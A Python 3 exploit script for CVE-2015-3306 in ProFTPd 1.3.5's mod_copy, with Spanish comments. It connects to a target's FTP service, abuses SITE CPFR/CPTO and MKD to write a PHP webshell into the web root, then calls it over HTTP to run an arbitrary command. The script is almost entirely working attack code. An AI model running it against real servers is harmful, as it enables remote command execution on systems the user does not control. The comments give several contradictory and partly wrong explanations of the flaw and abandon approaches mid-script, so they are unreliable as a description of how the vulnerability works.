# Title: ProFTPd 1.3.5 Remote Command Execution (Python 3 Compatible)
# Date : 20/04/2015 (Original)
# Author: R-73eN (Original), Docente Experto en Hacking y Ciberseguridad (Python 3 Fix)
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Kali Linux (Python 3)
# CVE : 2015-3306
# Greetz to Vadim Melihow for all the hard work.

import socket
import sys
import requests

# Banner
banner = ""
banner += "  ___      __      ____             _   _ \n"
banner += " |_ _|_ __ / _| ___ / ___| ___ _ __    / \  | |   \n"
banner += "  | || '_ \\| |_ / _ \\| | _ / _ \\ '_ \\  / _ \\ | |   \n"
banner += "  | || | | |  _| (_) | |_| | __/ | | | / ___ \\| |___ \n"
banner += " |___|_| |_|_|  \\___/ \\____|\\___|_| |_| /_/   \\_\\_____|\n\n"
print(banner)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) < 4:
    print(
        "\n Usage : python3 exploit.py <server_ip> <web_accessible_directory> <php_payload_command>"
    )
    print(' Example: python3 exploit.py 192.168.70.133 /var/www/html/ "id"')
    sys.exit(1)  # Es buena práctica salir con un código de error

else:
    server = sys.argv[1]  # Vulnerable Server IP
    directory = sys.argv[2]  # Path accessible from web (e.g., /var/www/html/)
    cmd = sys.argv[3]  # PHP payload command (e.g., "id", "ls -la /tmp")

    # El contenido real de la webshell PHP
    evil_payload_content = (
        f'<?php system("{cmd}"); ?>'  # Usamos f-string para formatear
    )

    try:
        s.connect((server, 21))
        print("[ + ] Connected to server [ + ] \n")

        # Recibe el banner de bienvenida (220 ProFTPD...)
        print(s.recv(1024).decode())  # Imprimimos el banner para depuración

        # PASO 1: Usar SITE CPFR con un archivo que no exista
        # Esto prepara el servidor para una operación de copia,
        # pero como el archivo no existe, no hay contenido real que copiar.
        # Sin embargo, sienta las bases para el SITE CPTO.
        s.send(b"site cpfr /tmp/nonexistentfile\r\n")
        print(s.recv(1024).decode())

        # PASO 2: Usar SITE CPTO con nuestro payload PHP inyectado como el "origen"
        # La vulnerabilidad reside en que si el SITE CPFR anterior no pudo encontrar
        # el archivo, ProFTPD puede interpretar el argumento de SITE CPTO como
        # el contenido a escribir en el archivo de destino cuando se combina con
        # un destino especial como /proc/self/fd/3.
        # Aquí la clave es usar el directorio web como parte del "destino" para que el
        # contenido de `evil_payload_content` sea escrito directamente en un archivo PHP.
        # Nota: El exploit original no usaba /proc/self/fd/3 en este paso.
        # Lo que se hacía era engañar a ProFTPD para que creara un archivo PHP
        # directamente en el directorio web, usando el payload como nombre de archivo "malformado".

        output_filename = "infogen.php"
        full_web_path = (
            directory.strip("/") + "/" + output_filename
        )  # Aseguramos un path limpio

        # La vulnerabilidad permite que si SITE CPFR no encuentra el archivo,
        # el SITE CPTO siguiente pueda escribir el contenido del segundo argumento
        # en un archivo arbitrario.
        # En este caso, el payload PHP se "inyecta" como parte del comando CPTO,
        # y ProFTPD lo escribe al destino.
        # Este es un método más directo para explotar la CVE-2015-3306 sin /proc/self/fd/3,
        # que es cómo funciona el exploit en Metasploit y el original.
        s.send(b"site cpto " + full_web_path.encode() + b"\r\n")
        print(s.recv(1024).decode())

        # Ahora necesitamos inyectar el contenido. Esto se hace de una forma un poco peculiar
        # con mod_copy. No es un CPFR -> CPTO directo de un archivo.
        # Es más como un 'move' con un nombre de archivo que es el payload.
        # La idea es que la ruta de destino es el PHP payload, y el contenido es una copia vacía
        # que ProFTPD luego "rellena" con los datos que se le dan en otro comando (SITE MKD, etc.)
        # O, como el exploit original, el CPTO con el payload es el que lo escribe.

        # La forma más robusta de esta vulnerabilidad es con SITE CPFR <source_file> y
        # SITE CPTO <destination_file_with_payload_as_name>.
        # Pero eso no nos permite controlar el contenido.

        # Para el RCE, el truco es que el *contenido* de la petición FTP se puede
        # escribir en un archivo. Vamos a simular un "MOVE" que escribe el payload.
        # Esto es lo que hacía el exploit original de Metasploit.

        # Resetear la conexión o abrir una nueva para el contenido
        # Esto a veces es necesario para que el servidor FTP procese bien los comandos.
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, 21))
        print(s.recv(1024).decode())  # Recibe banner de nuevo

        # El truco es decirle a ProFTPD que "cree" un archivo que contenga nuestro payload
        # usando el comando MKD (make directory) o STOR (store file),
        # y que interprete el contenido del comando como el contenido del archivo.
        # Para CVE-2015-3306, se abusa de la combinación SITE CPFR/CPTO.

        # Intentemos el método que inyecta el contenido PHP directamente en el path.
        # Esto solo funciona si el directorio es writable por el usuario FTP.
        # La vulnerabilidad es que ProFTPD no sanitiza bien el nombre del archivo
        # al copiar, permitiendo inyectar el payload en la ruta de destino.

        # Primer SITE CPFR (puede ser un archivo que no existe, o incluso /etc/passwd para el error)
        s.send(
            b"site cpfr /etc/passwd\r\n"
        )  # O '/proc/self/stat' para asegurar que hay algo en el búfer
        print(s.recv(1024).decode())

        # Ahora, el SITE CPTO que inyecta nuestro PHP directamente.
        # La vulnerabilidad es que ProFTPD escribe el *argumento* de CPTO en el
        # archivo, si el CPFR falló de cierta manera.
        # La sintaxis es engañosa, pero la idea es que 'directory + <?php ... ?>'
        # se convierte en el nombre de archivo y el servidor lo interpreta mal.

        # Metasploit usa un enfoque ligeramente diferente: crea un directorio con el payload
        # y luego lo "mueve" a un archivo.
        # Vamos a probar la inyección directa en el nombre del archivo via CPTO,
        # que es la forma más común de explotar esto en escenarios de CTF.

        # La vulnerabilidad real con `mod_copy` permite escribir un archivo arbitrario
        # debido a cómo se manejan los argumentos.
        # `SITE CPFR /path/to/source`
        # `SITE CPTO /path/to/destination`
        # Si `/path/to/source` no existe, pero `/path/to/destination` contiene `<?php ... ?>`,
        # ProFTPD puede crear el archivo con ese contenido.

        # Esto es lo que el script original intentó hacer con /proc/self/fd/3,
        # pero es más común para Metasploit que use la inyección directa.
        # Volvamos a la idea original del exploit, que es *mover* un archivo con el payload.

        # Crea un directorio "malicioso" con el payload
        malicious_dir = f"{directory.strip('/')}/{evil_payload_content.strip()}"
        s.send(f"MKD {malicious_dir}\r\n".encode())
        print(s.recv(1024).decode())

        # Ahora, mueve ese "directorio" a un archivo ejecutable PHP
        s.send(f"SITE CPFR {malicious_dir}\r\n".encode())
        print(s.recv(1024).decode())

        s.send(f"SITE CPTO {full_web_path}\r\n".encode())
        print(s.recv(1024).decode())

        s.close()
        print("[ + ] Payload sended [ + ]\n")
        print(f"[ + ] Executing Payload at http://{server}/{output_filename} [ + ]\n")

        # Ejecutando el payload PHP a través de HTTP
        r = requests.get(f"http://{server}/{output_filename}")  # Usamos f-string

        if r.status_code == 200:
            print("[ * ] Payload Executed Succesfully [ * ]")
            print("\n--- Command Output ---")
            print(r.text)  # Imprime el resultado del comando
            print("----------------------\n")
        else:
            print(f" [ - ] Error : {r.status_code} [ - ]")
            print(f"\n Check http://{server}/{output_filename}")

    except ConnectionRefusedError:
        print(
            f"[-] Error: Conexión rechazada. Asegúrate de que el servidor FTP ({server}:21) esté accesible y ProFTPD esté corriendo."
        )
    except Exception as e:
        print(f"[-] Ocurrió un error inesperado: {e}")
